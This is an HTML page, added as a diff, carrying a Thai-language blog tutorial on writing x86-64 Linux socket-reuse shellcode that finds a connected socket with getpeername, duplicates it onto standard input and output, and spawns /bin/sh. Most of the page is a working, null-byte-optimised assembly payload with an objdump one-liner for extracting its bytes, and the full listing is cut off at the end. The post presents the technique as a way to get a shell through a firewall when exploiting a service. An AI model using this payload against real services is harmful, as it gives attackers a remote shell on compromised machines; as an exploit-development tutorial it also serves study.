@@ -1,0 +1,677 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<title>
+  
+     Linux x86-64 Execve with Socket Reuse | 
+    SUAM
+  
+</title><meta name="description" content="เขียน Shellcode ทำ Socket Reuse บน Linux x86-64 ยังไง มาดูกันค้าบ"><meta name="author" content="Jusmistic">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png" sizes="180x180">
+<link rel="icon" href="/favicon-32x32.png " sizes="32x32" type="image/png">
+<link rel="icon" href="/favicon-16x16.png" sizes="16x16" type="image/png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#0c344b">
+<link rel="icon" href="/favicon.ico">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-173363806-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-173363806-1');
+</script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.17.1/themes/prism.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css" integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
+<link rel="stylesheet" href="/dist/main.min.css"><link rel="canonical" href="https://suam.wtf/posts/linux-x86-64-socket-reuse/"><meta property="og:title" content="Linux x86-64 Execve with Socket Reuse" />
+<meta property="og:description" content="เขียน Shellcode ทำ Socket Reuse บน Linux x86-64 ยังไง มาดูกันค้าบ" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://suam.wtf/posts/linux-x86-64-socket-reuse/" />
+<meta property="article:published_time" content="2021-03-22T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-03-22T00:00:00+00:00" />
+<meta itemprop="name" content="Linux x86-64 Execve with Socket Reuse">
+<meta itemprop="description" content="เขียน Shellcode ทำ Socket Reuse บน Linux x86-64 ยังไง มาดูกันค้าบ">
+<meta itemprop="datePublished" content="2021-03-22T00:00:00&#43;00:00" />
+<meta itemprop="dateModified" content="2021-03-22T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="2156">
+
+
+
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Linux x86-64 Execve with Socket Reuse"/>
+<meta name="twitter:description" content="เขียน Shellcode ทำ Socket Reuse บน Linux x86-64 ยังไง มาดูกันค้าบ"/>
+
+</head>
+<body>
+    
+<nav class="navbar navbar-expand-md navbar-light bg-light fixed-top shadow-sm" id="navbar-main-menu">
+    <div class="container">
+        <a class="navbar-brand font-weight-bold" href="https://suam.wtf/">SUAM</a>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#main-menu" aria-controls="main-menu" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="main-menu">
+            <ul class="navbar-nav ml-auto">
+                
+                    <li class="nav-item"><a class="nav-link" href="/">Home</a></li>
+                
+                    <li class="nav-item"><a class="nav-link" href="https://www.facebook.com/photo.php?fbid=3303186886378184&amp;set=a.540950052601895&amp;type=3">About</a></li>
+                
+            
+                <li class="nav-item">
+                    <a href="https://webring.wonderful.software#suam.wtf" title="วงแหวนเว็บ" target="_blank" class="nav-link" rel="noopener">
+                        <img src="/images/webring.black.svg" width="25px" height="25px" alt="วงแหวนเว็บ" />
+                    </a>
+                </li>
+            </ul>
+        </div>
+    </div>
+</nav>
+
+
+    
+<main class="content-page container pt-7 pb-5">
+    
+    <div class="row">
+        <div class="col">
+            <article>
+                <div class="row justify-content-center">
+                    <div class="col-lg-8">
+                        <div class="meta text-muted mb-3">
+                            <p class="created text-muted text-uppercase font-weight-bold mb-1">March 22, 2021</p>
+                            <span class="mr-2"><i class="fas fa-book-open mr-2"></i>2156 words</span>
+                            <span><i class="fas fa-clock mr-2"></i>11 mins read</span>
+                        </div>
+
+                        <h1>Linux x86-64 Execve with Socket Reuse</h1>
+
+                        <ul class="authors list-inline"><li class="list-inline-item mr-3">
+                    <div class="media author"><a href="/authors/jusmistic/" class="mr-3">
+                                    <picture>
+                                        <source srcset="/authors/jusmistic/Jusmistic_hub264f75c206ecb3907db6dab637b8dcc_222307_64x0_resize_q75_box.jpg 1x, /authors/jusmistic/Jusmistic_hub264f75c206ecb3907db6dab637b8dcc_222307_128x0_resize_q100_box.jpg 2x, /authors/jusmistic/Jusmistic_hub264f75c206ecb3907db6dab637b8dcc_222307_192x0_resize_q100_box.jpg 3x">
+                                        <img src="/authors/jusmistic/Jusmistic_hub264f75c206ecb3907db6dab637b8dcc_222307_64x0_resize_q75_box.jpg" class="rounded-circle" alt="Jusmistic">
+                                    </picture>
+                                </a><div class="media-body">
+                            <h5 class="name my-0"><a href="/authors/jusmistic/" class="small">Jusmistic</a>
+                            </h5><p class="social small text-muted">
+                                    <a href="https://twitter.com/@giiir4ffe">@Giiir4ffe</a>
+                                </p></div>
+                    </div>
+                </li></ul>
+                    </div>
+                </div><div class="row justify-content-center">
+                    <div class="col-lg-8">
+                        <div class="content">
+                            <p>ช่วงนี้อ่านเรื่อง socket reuse ดูเห็น Material เป็น x86 ซะส่วนใหญ่ ยังไม่เห็น shellcode ที่เป็น x86-64 เลย (ผมพยายามหาแล้ว แต่ไม่เจออ่ะ ใครเจอเม้นบอกด้วยนะครับ)</p>
+<p>โดยปกติแล้วเทคนิคนี้ค่อนข้างเก่า ส่วนตัวไม่เคยใช้ เทคนิคนี้มาก่อนเบย ถือโอกาสอ่ะลองทำซักหน่อย อย่างน้อย ๆ ก็ถือว่าหัดเขียน Assembly ขำ ๆ</p>
+<p>บอกก่อนว่า Ref ส่วนใหญ่ผมอ่านมาจาก x86 เพื่อดูว่าหลัก ๆ แล้วการทำ socket reuse ต้องทำอะไรบ้าง แล้วเอามาเขียนใหม่บน x86-64 แค่นั้นเลย ไม่ยาก ซึ่งโครงสร้างหลัก ๆ เอามาจากบทความนี้ขอให้เครดิตไปเต็มผมแค่ก็อปแนวคิดมาเขียนใหม่อ่ะ</p>
+<p><a href="https://d3fa1t.ninja/2017/09/17/linux-x86-one-way-shellcode-socket-reuse/">Linux x86 One-Way Shellcode (Socket Reuse)</a></p>
+<h2 id="socket-reuse-คออะไร-what">Socket Reuse คืออะไร? (What)</h2>
+<blockquote>
+<p>ผมว่าผมเขียนไม่ค่อยดีอ่ะ ว่าจะเขียนอธิบาย shellcode เฉย ๆ ไม่ได้จะเขียนทฤษฎี ขี้เกียจเขียนด้วย ถ้าไม่อยากรู้ก็ข้ามไม่อ่านหัวข้อถัดไปเลยค้าบบ</p>
+</blockquote>
+<p>ปกติแล้วใน Linux จะใช้สิ่งที่เรียกว่า File Descriptor (FD) ในการเข้าถึง Input/Output ต่าง ๆ เช่น ไฟล์ ซึ่งใน Linux เองจะมี FD พื้นฐานหลัก ๆ คือ</p>
+<ul>
+<li>STDIN ใช้ 0 เป็นค่า reference</li>
+<li>STDOUT ใช้ 1 เป็นค่า reference</li>
+<li>STDERR ใช้ 2 เป็นค่า reference</li>
+</ul>
+<p>จากลิสท์ด้านบนจะเห็นว่าจริง ๆ แล้ว FD จะถูกอ้างอิงจากตัวเลข โดยปกติถ้าโปรแกรมต้องการสร้าง FD เพื่อคุยกับอะไรบางอย่าง(socket/file) มันเริ่มรันจากค่าที่ต่ำที่สุด ซึ่งในที่นี้คือ 3 แล้วก็เพิ่มขึ้นไปเรื่อย ๆ</p>
+<p>ในบางโปรแกรมจะมีการเชื่อมต่อกับผู้ใช้ โดยไม่ได้ใช้ STDIN และ STDOUT แต่จะเขียน socket เพื่อรับ connection ผ่านทาง network แทน ทำให้โปรแกรมจะสร้าง FD เพิ่มและติดต่อกับผู้ใช้ผ่าน FD ใหม่</p>
+<p>หลังจากที่แล้ว spawn shell แล้วตัว shell จะใช้ STDIN และ STDOUT ปกติอยู่ ทำให้เราต้องใช้เทคนิค Socket Reuse เพื่อให้เราสามารถติดต่อกับ shell จาก FD ของ socket นั่นเอง</p>
+<h2 id="เมอไรและทำไมตองทำ-socket-reuse-whenwhy">เมื่อไรและทำไมต้องทำ Socket Reuse (When/Why)</h2>
+<p>ส่วนตัวผมเข้าใจว่า Socket Reuse มันไม่ใช่เทคนิคที่ใช้โจมตี แต่ใช้ Bypass Exploit Mitigation อย่างนึงซึ่งหลัก ๆ เลยคือ <strong>Service ที่เราไปโจมตีมันอยู่หลัง Firewall แล้วเราไม่สามารถทำ Bind/Reverse Shell ได้</strong> เราเลยต้องมาใช้ FD ที่เราทำการติดต่อกับ service นั้นเพื่อติดต่อกับ shell ของเราแทน</p>
+<h2 id="การทำ-socket-reuse-how">การทำ Socket Reuse (How)</h2>
+<p>อย่างที่บอกไปตอนต้น Socket Reuse ไม่ใช่เรื่องใหม่ ผมไม่ได้เป็นคนคิด ผมแค่ก็อป concept มาเขียนใหม่เป็น x86-64 เพราะผมยังไม่เห็นใครทำเฉย ๆ วันหลังถ้ามีคนอยากทำจะได้เอา shellcode ไปใช้หรือโมได้ง่าย ๆ</p>
+<p><strong>ขั้นตอนการทำ Socket Reuse มีทั้งหมด 3 ขั้นตอน</strong></p>
+<ol>
+<li>หา sockfd โดยใช้ฟังก์ชัน getpeername</li>
+<li>ใช้ dup2 system call เพื่อทำให้ FD 0, 1, และ 2 เชื่อมกับ sockfd ของเรา</li>
+<li>เรียก shell</li>
+</ol>
+<h3 id="1-หา-sockfd-โดยใชฟงกชน-getpeername">1. หา sockfd โดยใช้ฟังก์ชัน getpeername</h3>
+<p>เราสามารถใช้ฟังก์ชัน getpeername ในการตรวจสอบว่าเลข FD ที่เราส่งเข้าไปนั้นเป็น FD ของ socket รึเปล่าซึ่งเป็นค่าที่เราต้องการหาเพื่อนำมาใช้</p>
+<p>ซึ่งจาก <a href="https://man7.org/linux/man-pages/man2/getpeername.2.html">man-page</a> getpeername มีรายละเอียดดังนี้</p>
+<pre><code class="language-c">int getpeername(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
+</code></pre>
+<p>หากว่า sockfd ที่เราส่งเข้าไปที่ getpeername system call นั้นเป็น FD ของ socket จริง ๆ ค่าที่ตอบกลับมาใน RAX จะเป็น 0</p>
+<p>ซึ่งถ้าเราจะเรียกผ่าน syscall เราต้องจัดการ register ให้มีค่าดังนี้ <strong>เก่งป่ะ? จริง ๆ <a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md">แล้วก็อปมาจากนี่จ้า</a></strong></p>
+<ul>
+<li><strong>RAX</strong> = 0x34 ⇒ ค่า syscall ของ getpeername</li>
+<li><strong>RDI</strong> = sockfd ⇒ เลข FD ที่เราต้องการตรวจสอบ</li>
+<li><strong>RSI</strong> = *addr ⇒ pointer ไปยังพื้นที่ที่เราต้องการเก็บข้อ address ที่เกี่ยวกับ FD (16 bytes)</li>
+<li><strong>RDX</strong> = *addr_len ⇒ pointer ไปยังขนาดของ *addr</li>
+</ul>
+<blockquote>
+<p>จะเห็น *addr ต้องชี้ไปที่พื้นที่ขนาด 16 bytes ซึ่งใน shellcode นี้เราจะใช้ stack ถ้าต้องเอาไปทำ ROP ก็ไปโมกันเองค้าบ</p>
+</blockquote>
+<blockquote>
+<p>ผมไม่เข้าใจเหมือนกันว่าทำในบทความของ DHAYALAN ถึงใช้ syscall socketcall(0x66) ทั้ง ๆ ที่ใช้ getpeername เลยก็ได้อ่ะ</p>
+</blockquote>
+<h4 id="11-เราทำการเตรยมพวก-argument-ตาง-ๆ-กอนเลยซงจะเขยนไดประมาณน">1.1 เราทำการเตรียมพวก argument ต่าง ๆ ก่อนเลยซึ่งจะเขียนได้ประมาณนี้</h4>
+<p>กำหนดค่า rdx และ rdi ให้เป็น 0 ก่อน ปกติเวลาเราเขียน shellcode เมื่อต้องการให้ค่า register ตัวไหนเป็น 0 เราจะเอาตัวนั้น xor กับตัวมันเอง เพราะ $x$ $\oplus$ $x$ = 0
+จริง ๆ เราจะใช้ <code>xor rdi, rdi</code> ก็ได้ แต่นิสัยส่วนตัวผมชอบ <code>mov</code> จากค่าที่เป็น 0 มากกว่าค้าบ ใครถนัดแบบไหนก็เขียน ๆ ไปเถอะไม่ว่ากันค้าบ</p>
+<pre><code class="language-nasm">; Clear Register
+xor rdx, rdx        ; rdx = 0
+mov rdi, rdx        ; rdi = 0
+</code></pre>
+<p>จากการอ่าน Manual เรารู้ว่าตัวแปร addr เป็น pointer ของ struct ประเภท sockaddr ซึ่งมีหน้าตาประมาณนี้</p>
+<pre><code class="language-c">struct sockaddr {
+   unsigned short   sa_family;      // 2 bytes
+   char             sa_data[14];    // 14 bytes
+};
+</code></pre>
+<p>จาก struct ข้างต้นจะเห็นว่าเราต้องการพื้นที่ทั้งหมด 16 bytes เพื่อเก็บข้อมูลของตัวแปร addr</p>
+<p>เราทำการ <code>push rdx</code> ซึ่งมีค่าเป็น 0 ลงไปใน stack 2 ครั้งบน Intel x86-64 การ push แต่ละครั้งจะทำการลบค่า rsp ไป 8 (rsp = rsp - 8) จากนั้นทำการย้ายค่าของ rsp เข้าไปเก็บที่ rsi</p>
+<pre><code class="language-nasm">	; rsi = *addr
+	push rdx            ; prep stack for *addr
+	push rdx            ; prep stack for *addr
+	mov rsi, rsp        ; rsi = *addr
+</code></pre>
+<p>ตอนนี้ stack เราจะหน้าตาประมาณนี้</p>
+<pre><code>&lt;      Low Addr      &gt;
+[        ....        ]
+[ 0x0000000000000000 ]    &lt;- rsp, rsi
+[ 0x0000000000000000 ]    
+[ 0x0000000000c0ffee ]    &lt;- rsp ก่อน push 2 ครั้ง
+[        ....        ]
+&lt;      High Addr     &gt;
+</code></pre>
+<p>ตอนนี้ rsi ก็ได้เก็บ pointer ที่ชี้ไปยังพื้นที่ที่เราเตรียมไว้สำหรับตัวแปร addr เรียบร้อยแล้ว</p>
+<p>ทำการตั้งค่า dl (byte สุดท้ายของ rdx) เป็น 16 ซึ่งเป็นขนาดของ <code>struct sockaddr</code> นั่นเอง จากนั้นทำการ <code>push rdx</code> ลงไปใน stack จากนั้นทำการย้ายค่าของ rsp ไปเก็บใน rdx</p>
+<pre><code class="language-nasm">	; rdx = *addr_len
+	mov dl, 16          ; addr_len = 16
+	push rdx            ; push addr_len to stack
+	mov rdx, rsp        ; rdi = *addr_len
+	[...]
+</code></pre>
+<p>ตอนนี้ stack เราจะหน้าตาประมาณนี้</p>
+<pre><code>&lt;      Low Addr      &gt;
+[        ....        ]
+[ 0x0000000000000010 ]    &lt;- rdx, rsp
+[ 0x0000000000000000 ]    &lt;- rsi
+[ 0x0000000000000000 ]    
+[ 0x0000000000c0ffee ]     
+[        ....        ]
+&lt;      High Addr     &gt;
+</code></pre>
+<p>ขออธิบายเพิ่มเติมเกี่ยวกับ dl นิดนึง ให้แยกย่อยจะได้เป็นรูปประมาณนี้ จะเห็นว่า dl คือ byte สุดท้ายของ rdx นั่นเอง</p>
+<pre><code>[...........rdx..........]  8 bytes
+            [....edx.....]  4 bytes ท้ายของ rdx
+                  [..dx..]  2 bytes ท้ายของ edx
+                  [dh][dl]
+                   dh 1 byte แรกของ dx
+                   dl 1 byte ท้ายของ dx
+</code></pre>
+<p>อ่านมาถึงตรงนี้อาจมีบางคนมีคำถามว่าทำไมไม่ <code>mov rdx, 16</code> ไปเลยทำไมต้องมา <code>mov dl, 16</code> ด้วย
+คำตอบของข้อนี้ง่ายมากเมื่อเห็น opcode ของ Assembly ของทั้งสองคำสั่งนี้เมื่อทำการ assembler เรียบร้อยแล้ว ลองดูนี่นะค้าบ</p>
+<pre><code class="language-nasm">0:  48 c7 c2 10 00 00 00    mov    rdx,0x10
+</code></pre>
+<pre><code class="language-nasm">0:  b2 10                   mov    dl,0x10
+</code></pre>
+<p>เห็นอะไรมั้ยครับ จะเห็นว่า <code>mov rdx, 16</code> มันจะมี null ใน opcode ด้วยอีกทั้งยังยาว 7 bytes แต่กลับกัน <code>mov dl, 16</code> นั้นไม่มี null ใน opcode และยังยาวเพียงแค่ 2 bytes เท่านั้น</p>
+<p>ซึ่งสิ่งที่เราต้องคำนึงเสมอในการเขียน Assembly เพื่อเอาไปทำ shellcode นั้นหลัก ๆ มี 2 อย่าง</p>
+<ol>
+<li>null byte เพราะอาจไปทำให้ shellcode ของเราขาดได้เพราะฟังก์ชันบางตัวอาจตัด input ที่ null byte เช่น strcpy, strcat</li>
+<li>ความยาวของ shellcode เนื่องจากบางทีพื้นที่ที่เราสามารถใส่ shellcode ได้นั้นอาจมีจำกัดฉนั้นยิ่งเราเขียนสั้นได้เท่าไรยิ่งดี</li>
+</ol>
+<p><em>สำหรับบางคนที่พึ่งหัดเขียน Assembly เพื่อไปเขียน shellcode อาจเริ่มจากเขียนให้ถูกก่อน จากนั้นค่อยมาทำการแก้ไขคำสั่งเพื่อไม่ให้มี null byte และมีขนาดสั้นลงในภายหลัง แต่คนเท่ ๆ แบบผมเก่งอยู่แล้ว เขียนไป optimize ไปได้เลย 😎 (หยอก ๆ)</em></p>
+<p>พอ ๆ โม้มาเยอะและ กลับเข้ามา shellcode ของเราดีกว่าค้าบ ตอนนี้ argument สำหรับฟังก์ชัน getpeername เราพร้อมเรียบร้อยแล้ว</p>
+<h4 id="12-ทำการเรยก-getpeername-ผาน-syscall">1.2 ทำการเรียก getpeername ผ่าน Syscall</h4>
+<p>จะเห็นว่าเรามีการทำ label ชื่อ loop_findfd เพื่อใช้ในการ <code>jmp</code> กลับมาเพื่อทำการ loop การทำงาน จากนั้นทำการเพิ่มค่า rdi ขึ้น 1 (ตอนแรกมีค่าเป็น 0) นั่นหมายความว่าค่า rdi ซึ่งเป็นตัวแปร sockfd ที่เราส่งค่าเข้าไปในฟังก์ชัน getpeername จะเพิ่มขึ้นทุกครั้งเมื่อทำการ loop นั่นเอง</p>
+<pre><code class="language-nasm">; syscall getpeername
+    loop_findfd:
+    ; rdi = sockfc
+    inc rdi             ; inc every time when we loop
+</code></pre>
+<p>จากนัั้นก็ตั้งค่า rax เป็น 0x34 (จะใส่เป็นเลขฐาน 10 หรือ 16 ก็ได้แล้วแต่ถนัด) ลักษณะเดียวกันกับก่อนหน้านั่นเอง</p>
+<pre><code class="language-nasm">    xor rax, rax        ; rax = 0
+    mov al, 0x34        ; rax = 0x34
+    syscall             ; call getpeername
+</code></pre>
+<h4 id="13-ทำการตรวจคา-rax-เพอหา-sockfd">1.3 ทำการตรวจค่า rax เพื่อหา sockfd</h4>
+<p>โดยปกติแล้วบน Intel x86-64 เวลา system call คืนค่าจะส่งออกมาผ่าน rax ซึ่ง syscall ของ getpeername ก็เช่นเดียวกัน</p>
+<p>อย่างที่เราได้อธิบายไว้ตอนอ่าน man-page ว่าหากเจอ FD ที่เป็น sockfd ค่าที่ตอบกลับมาจะต้องเป็น 0 (rax = 0) นั่นเอง</p>
+<p>สิ่งที่เราทำคือเราใช้คำสั่ง <code>test rax, rax</code> ในการตรวจสอบ <a href="https://en.wikipedia.org/wiki/TEST_(x86_instruction)#:~:text=In%20the%20x86%20assembly%20language,while%20AF%20flag%20is%20undefined.">การทำงานของคำสั่ง test ดูได้ที่นี่</a> ให้อธิบายเร็ว ๆ คือหากค่าของ rax != 0 เราจะ <code>jmp</code> กลับไปที่ loop_findfd เพื่อหา sockfd จนกว่าจะเจอ</p>
+<pre><code class="language-nasm">	test rax, rax       ; if rax != 0 jmp to loop_findfd
+	                        ; else =&gt; rdi is sockfd -&gt; dup 
+	jne loop_findfd
+</code></pre>
+<p>ซึ่งถ้าเมื่อได้ค่า sockfd ที่เราตามหา (rax = 0) มันก็จะไม่ <code>jmp</code> แล้วไปทำงานที่คำสั่งต่อไปค้าบ โดยที่ค่า sockfd จะอยู่ที่ rdi นั้นเองค้าบ</p>
+<blockquote>
+<p>จริง ๆ ตรงนี้เราอาจตรวจสอบเพิ่มเติมด้วยว่า FD นี้เป็นของ IP เราจริง ๆ รึเปล่าแต่ผมขี้เกียจเขียนอ่ะ ถ้าใครอยากตรวจสอบเพิ่มค่าของ IP Address อยู่ที่ตำแหน่ง <code>rsi+4</code> นะค้าบบบ</p>
+</blockquote>
+<p>เมื่อเราเอาทั้งหมดมาประกอบร่าง Assembly ของเราจะหน้าตาประมาณนี้ค้าบบ</p>
+<pre><code class="language-nasm">find_fd:
+
+    xor rdx, rdx        ; rdx = 0
+    mov rdi, rdx        ; rdi = 0
+    
+    ; rsi = *addr
+    push rdx            ; prep stack for *addr
+    push rdx            ; prep stack for *addr
+    mov rsi, rsp        ; rsi = *addr
+
+    ; rdx = *addr_len
+    mov dl, 16          ; addr_len = 16
+    push rdx            ; push addr_len to stack
+    mov rdx, rsp        ; rdi = *addr_len
+
+    loop_findfd:
+    ; rdi = sockfc
+    inc rdi             ; inc every loop
+
+    xor rax, rax        ; rax = 0
+    mov al, 0x34        ; rax = 0x34
+    syscall             ; call getpeername
+
+    test rax, rax       ; if rax != 0 jmp to loop_findfd
+                        ; else =&gt; rdi is sockfd -&gt; dup2 
+    jne loop_findfd
+</code></pre>
+<h3 id="2-ใชฟงกชน-dup2-เพอทำให-fd-0-1-และ-2-เชอมกบ-sockfd-ของเรา">2. ใช้ฟังก์ชัน dup2 เพื่อทำให้ fd 0, 1, และ 2 เชื่อมกับ sockfd ของเรา</h3>
+<p>เมื่อเราได้ค่า sockfd ที่เราต้องการ (ซึ่งตอนนี้อยู่ที่ rdi) สิ่งที่เราต้องทำต่อไปคือใช้งาน system call <code>dup2</code> เพื่อคัดลอก sockfd ของ socket เราไปทับ STDIN, STDOUT และ STDERR จะทำให้เราสามารถติดต่อกับ shell ได้นั้นเอง</p>
+<p>ซึ่งจาก <a href="https://man7.org/linux/man-pages/man2/dup2.2.html">man-page</a> page dup2 ต้องการ argument ดังนี้</p>
+<pre><code class="language-c">int dup2(int oldfd, int newfd);
+</code></pre>
+<p>ซึ่งถ้าเราจะเรียกผ่าน syscall เราต้องจัดการ register ให้มีค่าดังนี้</p>
+<ul>
+<li><strong>RAX</strong> = 0x21</li>
+<li><strong>RDI</strong> = sockfd</li>
+<li><strong>RSI</strong> = 0,1,2</li>
+</ul>
+<p>เมื่อเรารู้แล้วว่าเราต้องทำการตั่งค่า register เพื่อใช้ในการเรียก syscall ยังไงบ้าง เรามาวางแผนกันดีกว่าจะเขียนยังไง ถ้าหากเขียนเป็น C จะได้ประมาณนี้</p>
+<pre><code class="language-c">dup2(sockfd, 0);    //rdi = sockfd, rsi = 0
+dup2(sockfd, 1);    //rdi = sockfd, rsi = 1
+dup2(sockfd, 2);    //rdi = sockfd, rsi = 2
+</code></pre>
+<p>จะเห็นว่าเราต้องทำการเรียก dup2 ทั้งหมด 3 รอบโดยค่า rdi คงเดิมและค่า rsi เพิ่มขึ้นทีละ 1 จากข้อก่อนหน้าค่าของ rdi เป็น sockfd อยู่แล้วนั่นหมายความว่าเราไม่ต้องไปแก้ไขอะไรเลย</p>
+<p>เราจึงมาดูที่ค่า rsi กันต่อ จะเริ่มด้วยการตั้งค่า rsi เป็น 0 ก่อนเลย</p>
+<pre><code class="language-nasm">  xor rsi, rsi        ; rsi = 0
+</code></pre>
+<p>จากนั้นทำการ label loop_dup2 เพื่อใช้ในการทำ loop และทำการตั้งค่า rax เป็น 0x21 ซึ่งเป็น syscall ของ dup2</p>
+<pre><code class="language-nasm">  loop_dup2:
+  mov rax, rsi
+  mov al, 0x21        ; rax = 0x21
+  syscall             ; call dup2(sockfd, rsi)
+</code></pre>
+<p>เมื่อทำ syscall สำเร็จเราก็จะทำการเพิ่มค่า rsi ขึ้น 1 จากนั้นเอาไป <code>cmp sil, 0x3</code> ว่า sil (byte สุดท้ายของ rsi) นั้นเท่ากับ 3 หรือยังถ้ายังก็ <code>jmp</code> กลับไปที่ <code>loop_dup2</code> เพื่อทำการ dup2 ให้ครบทั้ง 0, 1, และ 2</p>
+<pre><code class="language-nasm">  inc rsi
+  cmp sil, 0x3        ; if rsi != 3 jmp back to loop_dup2
+                      ; else execv spawn shell
+  jne loop_dup2
+</code></pre>
+<p>ถ้าหากทำการ dup2 ครบแล้วตอนนี้ค่าของ rsi ควรจะมีค่า เป็น 3 เมื่อทำการ <code>cmp</code> ก็จะไม่ทำการ <code>jmp</code> กลับไปที่ <code>loop_dup2</code> อีกต่อไป</p>
+<p>ซึ่งตอนนี้เองเนี่ยทำการเชื่อม sockfd ของเราเข้ากับ STDIN, STDOUT, และ STDERR เรียบร้อย เอามารวมกันเราจะได้ assembly ประมาณนี้ค้าบบบ</p>
+<pre><code class="language-nasm">dup2:
+    xor rsi, rsi        ; rsi = 0
+
+    loop_dup2:
+    mov rax, rsi
+    mov al, 0x21        ; rax = 0x21
+    syscall             ; call dup2(sockfd, rsi)
+
+    inc rsi
+    cmp sil, 0x3        ; if rsi != 3 jmp back to loop_dup2
+                        ; else execv spawn shell
+    jne loop_dup2
+</code></pre>
+<h3 id="3-เรยก-shell">3. เรียก Shell</h3>
+<p>ผมเขียนให้เรียก <code>/bin/sh</code> ไม่เป็นด้วยความเป็น Script kiddie ขอยาดก็อป Assembly เพื่อเอามาเขียน shellcode มาจาก <a href="http://shell-storm.org/shellcode/files/shellcode-806.php">Shellstorm</a> นะค้าบบบ</p>
+<p>ในเมื่อผมไม่ได้เขียนเอง ผมก็ไม่เข้าใจว่ามันทำงานยังไง เลยอธิบายให้ทุกคนฟังไม่ได้จริง ๆ ค้าบ</p>
+<p>ยังไงรบกวนทุกคนลองแกะดูหน่อยนะครับว่า assembly ชุดนี้มันทำงานอะไร แล้วทำไมต้องเขียนแบบนี้ ทำไมต้องใช้ neg ใช้อย่างอื่นได้มั้ย ตอนที่ shellcode ทำงาน stack มันจะหน้าตาประมาณไหน แค่คิดก็น่าสนุกแล้วใช่มั้ยค้าบ ลองเอาไปทำดูกันนะค้าบ แล้วอย่าลืมกลับมาสอนผมด้วย 😂</p>
+<p>หรือถ้าใครงงจริง ๆ ทักไปถาม <a href="https://web.facebook.com/bank.eakasit">@Bank</a> ได้เลยนะครับ ไม่ต้องเกรงใจ</p>
+<pre><code class="language-nasm">exec_shell:
+	xor rax, rax
+	mov rbx, 0xFF978CD091969DD1
+	neg rbx
+	push rbx
+	push rsp
+	pop rdi
+	cdq
+	push rdx
+	push rdi
+	push rsp
+	pop rsi
+	mov al, 0x3b
+	syscall
+</code></pre>
+<p>จบแล้วครัพ เมื่อเอามาประกอบร่างกันก็จะได้แบบนี้</p>
+<pre><code class="language-nasm">; Linux x86-64 - Execve (&quot;/bin/sh&quot;) Socket Reuse
+; Length: 79 bytes
+; Date: 21/03/2021
+; Author: Puttimate &quot;Jusmistic&quot; Thammasaeng
+; Tested on: x86_64 Debian GNU/Linux
+
+; Socket Reuse x86-64
+; 1. Finding sockfd using getpeername function.
+; 2. Call dup2 sockfd with 0,1 and 2.
+; 3. Execute /bin/sh.
+
+; nasm -f elf64 socket_reuse.asm -o socket_reuse
+; objdump -d ./socket_reuse |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/&quot;/'|sed 's/$/&quot;/g'
+; Ref: https://d3fa1t.ninja/2017/09/17/linux-x86-one-way-shellcode-socket-reuse/
+
+find_fd:
+    ; 1. Finding sockfd using getpeername function.
+    ; int getpeername(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
+    ;   src: https://man7.org/linux/man-pages/man2/getpeername.2.html
+    ; getpeername syscall: 0x34 
+    ;   rax = 0x34 
+    ;   rdi = sockfd
+    ;   rsi = *addr
+    ;   rdx = *addr_len
+    ;   src: https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md
+    ;   Note:
+    ;       sockaddr size is 16 bytes.
+    ;   Solution:
+    ;       1. Prepare stack for *addr and *addr_len
+    ;       2. Call getpeername(sockfd++, ...)
+    ;       3. loop until rax eq 0 (if the sockfd is correct rax will eq 0)
+    ;       After we found a sockfd IP Address will store at rsi+4.
+    ;       You can add an IP checking if you want.
+
+    xor rdx, rdx        ; rdx = 0
+    mov rdi, rdx        ; rdi = 0
+    
+    ; rsi = *addr
+    push rdx            ; prep stack for *addr
+    push rdx            ; prep stack for *addr
+    mov rsi, rsp        ; rsi = *addr
+
+    ; rdx = *addr_len
+    mov dl, 16          ; addr_len = 16
+    push rdx            ; push addr_len to stack
+    mov rdx, rsp        ; rdi = *addr_len
+
+    ; syscall getpeername
+    loop_findfd:
+    ; rdi = sockfc
+    inc rdi             ; inc every loop
+
+    xor rax, rax        ; rax = 0
+    mov al, 0x34        ; rax = 0x34
+    syscall             ; call getpeername
+
+    test rax, rax       ; if rax != 0 jmp to loop_findfd
+                        ; else =&gt; rdi is sockfd -&gt; dup2 
+    jne loop_findfd
+
+
+dup2:
+    ; 2. Call dup2 sockfd with 0,1 and 2.
+    ; int dup2(int oldfd, int newfd);
+    ;   src: https://man7.org/linux/man-pages/man2/dup2.2.html
+    ; dup2 syscall number: 0x21
+    ;   rax = 0x21
+    ;   rdi = sockfd
+    ;   rsi = 0,1,2
+    ;   src: https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md
+    ; Solution:
+    ;   1. Setup arg for dup2 function.
+    ;   2. Call dup2 function.
+
+    xor rsi, rsi        ; rsi = 0
+
+    loop_dup2:
+    mov rax, rsi
+    mov al, 0x21        ; rax = 0x21
+    syscall             ; call dup2(sockfd, rsi)
+
+    inc rsi
+    cmp sil, 0x3        ; if rsi != 3 jmp back to loop_dup2
